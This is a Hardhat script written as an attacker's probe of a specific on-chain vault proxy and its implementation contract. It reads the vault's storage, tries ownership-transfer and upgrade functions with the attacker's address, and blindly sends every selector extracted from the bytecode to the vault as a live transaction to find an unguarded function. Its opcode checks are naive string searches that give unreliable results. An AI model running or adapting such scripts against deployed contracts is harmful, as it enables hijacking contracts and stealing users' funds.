const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";

/**
 * @title Implementation Contract Analyzer
 * @notice Deep analysis of the implementation contract
 * @dev Find hidden functions and storage patterns
 */
async function main() {
  console.log("\n🔬 IMPLEMENTATION CONTRACT ANALYSIS");
  console.log("=====================================");
  console.log("Vault:", VAULT_ADDRESS);
  console.log("Implementation:", IMPLEMENTATION_ADDRESS);
  
  const [attacker] = await ethers.getSigners();
  
  // Get implementation bytecode
  const implCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
  console.log("\n📊 Implementation details:");
  console.log("Code size:", implCode.length / 2 - 1, "bytes");
  console.log("Code hash:", ethers.keccak256(implCode).slice(0, 10));
  
  // Analyze for specific patterns
  console.log("\n🔍 Bytecode pattern analysis:");
  
  // Check for SELFDESTRUCT (0xff)
  const selfdestructIndex = implCode.indexOf('ff');
  if (selfdestructIndex > -1) {
    console.log("⚠️  SELFDESTRUCT opcode found at position:", selfdestructIndex / 2);
  }
  
  // Check for DELEGATECALL (0xf4)
  const delegatecallIndices = [];
  let idx = implCode.indexOf('f4');
  while (idx > -1) {
    delegatecallIndices.push(idx / 2);
    idx = implCode.indexOf('f4', idx + 2);
  }
  if (delegatecallIndices.length > 0) {
    console.log("⚠️  DELEGATECALL opcodes found at positions:", delegatecallIndices.slice(0, 5));
  }
  
  // Check for common storage slots
  console.log("\n📦 Checking storage slots:");
  
  const storageSlots = [
    { slot: "0x0", name: "Slot 0 (often owner/admin)" },
    { slot: "0x1", name: "Slot 1 (often paused/initialized)" },
    { slot: "0x2", name: "Slot 2" },
    { slot: "0x3", name: "Slot 3" },
    { slot: "0x4", name: "Slot 4" },
    { slot: "0x5", name: "Slot 5" },
    { slot: ethers.keccak256(ethers.toUtf8Bytes("eip1967.proxy.implementation")), name: "EIP1967 Implementation" },
    { slot: ethers.keccak256(ethers.toUtf8Bytes("eip1967.proxy.admin")), name: "EIP1967 Admin" }
  ];
  
  for (const { slot, name } of storageSlots) {
    try {
      const value = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
      if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
        console.log(`${name}: ${value}`);
      }
    } catch (e) {
      // Continue
    }
  }
  
  // Try to call implementation directly
  console.log("\n🎯 Testing direct implementation calls:");
  
  // Common admin functions
  const adminFunctions = [
    { sig: "0x715018a6", name: "renounceOwnership()" },
    { sig: "0xf2fde38b", name: "transferOwnership(address)" },
    { sig: "0x3659cfe6", name: "upgradeTo(address)" },
    { sig: "0x4f1ef286", name: "upgradeToAndCall(address,bytes)" },
    { sig: "0x8da5cb5b", name: "owner()" },
    { sig: "0xf851a440", name: "admin()" },
    { sig: "0x5c60da1b", name: "implementation()" }
  ];
  
  for (const func of adminFunctions) {
    try {
      let calldata = func.sig;
      
      if (func.name.includes("(address)")) {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      }
      
      const result = await attacker.call({
        to: IMPLEMENTATION_ADDRESS,
        data: calldata
      });
      
      if (result && result !== "0x") {
        console.log(`✅ ${func.name} responded:`, result.slice(0, 66));
      }
    } catch (e) {
      // Silent
    }
  }
  
  // Analyze function selectors in bytecode
  console.log("\n📜 Extracting function selectors from bytecode:");
  
  // Look for PUSH4 instructions (63) followed by 4 bytes
  const push4Pattern = /63([0-9a-f]{8})/g;
  const selectors = new Set();
  let match;
  
  while ((match = push4Pattern.exec(implCode)) !== null) {
    const selector = "0x" + match[1];
    selectors.add(selector);
  }
  
  console.log("Found", selectors.size, "potential function selectors");
  const selectorArray = Array.from(selectors).slice(0, 20);
  console.log("First 20:", selectorArray);
  
  // Test these selectors
  console.log("\n🧪 Testing extracted selectors:");
  
  for (const selector of selectorArray) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`✅ ${selector} executed successfully`);
    } catch (e) {
      // Silent
    }
  }
  
  // Try to find USDC-related functions
  console.log("\n💵 Searching for token-related patterns:");
  
  // Common token function signatures
  const tokenPatterns = [
    "a9059cbb", // transfer
    "23b872dd", // transferFrom
    "095ea7b3", // approve
    "70a08231", // balanceOf
    "dd62ed3e", // allowance
  ];
  
  for (const pattern of tokenPatterns) {
    if (implCode.includes(pattern)) {
      console.log(`✅ Found token function: 0x${pattern}`);
    }
  }
  
  // Check if implementation has been changed
  const currentImpl = await attacker.call({
    to: VAULT_ADDRESS,
    data: "0x60c7d295"
  });
  
  console.log("\n🔄 Current implementation check:");
  console.log("Implementation address:", "0x" + currentImpl.slice(26));
  console.log("Matches expected:", currentImpl.slice(26).toLowerCase() === IMPLEMENTATION_ADDRESS.slice(2).toLowerCase());
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
